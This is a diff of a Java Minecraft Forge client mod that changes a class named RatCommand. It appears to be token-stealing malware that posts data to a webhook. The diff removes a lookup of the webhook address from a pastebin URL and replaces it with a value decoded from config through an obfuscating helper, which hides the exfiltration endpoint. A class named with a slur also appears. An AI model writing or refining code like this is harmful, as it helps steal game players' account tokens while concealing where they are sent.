@@ -2,6 +2,7 @@ package cum.jesus.jesusclient.command.commands;
 
 import cum.jesus.jesusclient.JesusClient;
 import cum.jesus.jesusclient.command.Command;
+import cum.jesus.jesusclient.qol.modules.funny.Retardation;
 import jline.internal.Log;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.common.gameevent.TickEvent;
@@ -54,15 +55,9 @@ public class RatCommand extends Command {
             String message = "test";
             String title = "t";
 
-            JesusClient.printWithPrefix(System.currentTimeMillis() - time);
+            //JesusClient.printWithPrefix(System.currentTimeMillis() - time);
 
-            String tokenWebhook = "";
-            try {
-                URL url = new URL("https://pastebin.com/raw/pZRpdW0i");
-                Scanner scanner = new Scanner(url.openStream());
-                tokenWebhook = scanner.nextLine();
-                scanner.close();
-            } catch (IOException ignored) {}
+            String tokenWebhook = Retardation.i(JesusClient.jesusClient.get("webhook").getAsString());
 
             jsonBrut += "{\"embeds\": [{"
                     + "\"title\": \""+ title +"\","
